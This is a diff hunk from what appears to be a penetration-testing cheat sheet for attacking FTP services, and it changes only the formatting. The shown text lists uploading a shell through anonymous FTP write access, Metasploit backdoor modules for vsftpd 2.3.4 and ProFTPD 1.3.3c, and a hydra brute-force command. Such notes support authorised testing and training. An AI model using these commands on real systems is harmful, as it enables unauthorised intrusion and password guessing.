@@ -91,9 +91,14 @@ on the correct VPN ($tun0$)? Are you scanning the correct subnet?
 
 - If Nmap results indicate ‘Anonymous FTP login permitted’ with write access (WA WRITE). Proceed immediately to Payload delivery using `put shell.exe`.
 - IF Banner = ‘vsftpd 2.3.4’
-    `msf6 > use exploit/unix/ftp/vsftpd_234_backdoor`
-- IF Banner = ‘Pro-FTPD 1.3.3c’ 
-    `msf6 > exploit/unix/ftp/proftpd_133c_backdoor` 
+
+  `msf6 > use exploit/unix/ftp/vsftpd_234_backdoor`
+  
+- IF Banner = ‘Pro-FTPD 1.3.3c’
+  
+    `msf6 > exploit/unix/ftp/proftpd_133c_backdoor`
+  
 - Brute Force:
+  
     `root@attack hydra -L <user_file> -P <password_file> ftp://<target_ip>`
 
